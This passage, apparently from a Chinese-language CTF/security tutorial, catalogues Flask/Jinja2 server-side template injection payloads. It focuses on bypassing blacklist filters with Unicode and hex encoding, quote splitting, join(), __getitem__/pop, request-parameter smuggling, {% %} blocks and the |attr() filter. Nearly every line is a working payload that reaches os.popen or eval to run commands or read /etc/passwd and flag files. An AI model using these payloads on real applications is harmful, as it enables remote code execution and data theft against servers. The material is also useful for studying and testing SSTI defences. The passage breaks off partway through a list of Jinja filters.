可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。
### 利用Unicode编码绕过关键字（flask适用）
unicode编码绕过是一种网上没提出的方法。
我们可以利用unicode编码的方法，绕过关键字过滤，例如：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
等同于：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
### 利用Hex编码绕过关键字
和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。
我们可以利用hex编码的方法，绕过关键字过滤，例如：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
等同于：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
### 利用引号绕过
我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 `fl""ag` 或 `fl''ag` 的形式来绕过：
    [].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
再如：
    ().__class__.__base__.__subclasses__()[77].__init__.__globals__['o''s'].popen('ls').read()
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil''tins__']['eval']('__import__("os").popen("ls /").read()')}}
可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过。
### 利用join()函数绕过
我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：
    [].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
## 绕过其他字符
### 过滤了中括号[ ]
**利用`__getitem__()` 绕过**
可以使用 `__getitem__()` 方法输出序列属性中的某个索引处的元素，如：
    "".__class__.__mro__[2]
    "".__class__.__mro__.__getitem__(2)
    ['__builtins__'].__getitem__('eval')
如下示例：
    {{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性
    {{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
**利用 pop() 绕过**
pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：
    {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}       // 指定序列属性
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
注意：最好不要用pop()，因为pop()会删除相应位置的值。
**利用字典读取绕过**
我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 `[]` 里来访问，一种就是用点 `.` 来访问。所以，当方括号 `[]`
被过滤之后，我们还可以用点 `.` 的方式来访问，如下示例
    // __builtins__.eval()
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
等同于：
    // [__builtins__]['eval']()
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
### 过滤了引号
**利用chr()绕过**
先获取chr()函数，赋值给chr，后面再拼接成一个字符串
    {% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
    # {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
等同于
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
**利用request对象绕过**
示例：
    {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
等同于：
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。
### 过滤了下划线__
**利用request对象绕过**
    {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
    {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
等同于：
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
### 过滤了点 .
**利用`|attr()` 绕过（适用于flask）**
如果 `.` 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数`attr()`，即：
    ().__class__   =>  ()|attr("__class__")
示例：
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}
等同于：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
**利用中括号[ ]绕过**
如下示例：
    {{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
等同于：
    {{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
**这样的话，那么`__class__`、`__bases__` 等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。**
### 过滤了大括号 `{{`
我们可以用Jinja2的 `{%...%}` 语句装载一个循环控制语句来绕过：
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
也可以使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 将执行结果外带（不外带的话无回显）出来：
    {% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
也可以用 `{%print(......)%}` 的形式来代替 `{{` ，如下：
    {%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}
## 利用 `|attr()` 来Bypass
这里说一个新东西，就是原生JinJa2函数 `attr()`，这是一个 `attr()`
过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ `|` ）分割。如：
    foo|attr("bar")   等同于   foo["bar"]
`|attr()` 配合其他姿势可同时绕过双下划线 `__` 、引号、点 `.` 和 `[` 等，下面给出示例。
### 同时过滤了 . 和 []
过滤了以下字符：
    .    [
绕过姿势：
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
等同于：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
### 同时过滤了 __ 、点. 和 []
过滤了以下字符：
    __    .    [    "
下面我们演示绕过姿势，先写出payload的原型：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
由于中括号 `[` 被过滤了，我们可以用 `__getitem__()` 来绕过（尽量不要用pop()），类似如下：
    {{().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}
由于还过滤了下划线 `__`，我们可以用request对象绕过，但是还过滤了中括号 `[]`，所以我们要同时绕过 `__` 和
`[`，就用到了我们的`|attr()`
所以最终的payload如下：
    {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
### 用Unicode编码配合 `|attr()` 进行Bypass
过滤了以下字符：
    '  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__
我们用 `{%...%}`绕过对 `{{` 的过滤，并用unicode绕过对关键字的过滤。unicode绕过是一种网上没提出的方法。
假设我们要构造的payload原型为：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
先用 `|attr` 绕过 `.` 和 `[]`：
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
我们可以将过滤掉的字符用unicode替换掉：
    {{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}
### 用Hex编码配合 `|attr()` 进行Bypass
和上面那个一样，只不过是将Unicode编码换成了Hex编码，适用于“u”被过滤了的情况。
我们可以将过滤掉的字符用Hex编码替换掉：
    {{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
## 使用 JinJa 的过滤器进行Bypass
在 Flask JinJa
中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。
详情请看官方文档：
以下是内置的所有的过滤器列表：
[`abs()`](https://jinja.palletsprojects.com/en/master/templates/#abs) |
[`float()`](https://jinja.palletsprojects.com/en/master/templates/#float) |
[`lower()`](https://jinja.palletsprojects.com/en/master/templates/#lower) |
[`round()`](https://jinja.palletsprojects.com/en/master/templates/#round) |
[`tojson()`](https://jinja.palletsprojects.com/en/master/templates/#tojson)  
---|---|---|---|---  
[`attr()`](https://jinja.palletsprojects.com/en/master/templates/#attr) |
[`forceescape()`](https://jinja.palletsprojects.com/en/master/templates/#forceescape)
| [`map()`](https://jinja.palletsprojects.com/en/master/templates/#map) |
[`safe()`](https://jinja.palletsprojects.com/en/master/templates/#safe) |
[`trim()`](https://jinja.palletsprojects.com/en/master/templates/#trim)  
[`batch()`](https://jinja.palletsprojects.com/en/master/templates/#batch) |
[`format()`](https://jinja.palletsprojects.com/en/master/templates/#format) |
[`max()`](https://jinja.palletsprojects.com/en/master/templates/#max) |
[`select()`](https://jinja.palletsprojects.com/en/master/templates/#select) |
[`truncate()`](https://jinja.palletsprojects.com/en/master/templates/#truncate)  
[`capitalize()`](https://jinja.palletsprojects.com/en/master/templates/#capitalize)
|
[`groupby()`](https://jinja.palletsprojects.com/en/master/templates/#groupby)
| [`min()`](https://jinja.palletsprojects.com/en/master/templates/#min) |
[`selectattr()`](https://jinja.palletsprojects.com/en/master/templates/#selectattr)
| [`unique()`](https://jinja.palletsprojects.com/en/master/templates/#unique)  